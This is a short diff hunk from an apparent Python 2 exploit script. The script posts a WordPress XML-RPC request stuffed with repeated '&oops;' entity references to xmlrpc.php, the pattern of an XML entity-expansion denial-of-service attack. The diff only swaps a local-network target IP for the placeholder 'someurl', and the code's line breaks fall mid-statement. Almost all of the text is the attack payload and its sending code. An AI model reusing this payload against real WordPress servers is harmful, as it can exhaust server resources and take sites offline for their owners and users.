@@ -257,7 +257,7 @@ oops;&oops;&oops;&oops;&oops;&oops;&oops;&oops;&oops;&oops;&oops;&oops;&oops;&oo
 oc;&oops;&oops;&oops;&oops;&oops;&oops;&oops;&oops;&oops;</methodName>   <params>
 <param><value>aa</value></param>    <param><value>aa</value></param>
 </params> </methodCall>""" req =
-urllib2.Request('http://192.168.1.15/wordpress/xmlrpc.php',data)
+urllib2.Request('http://someurl/xmlrpc.php',data)
 req.add_header('Accept', '*/*') req.add_header('User-Agent', 'Mozilla/5.0
 (Windows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0')
 req.add_header('Connection', '') req.add_header('Content-type', 'text/xml')
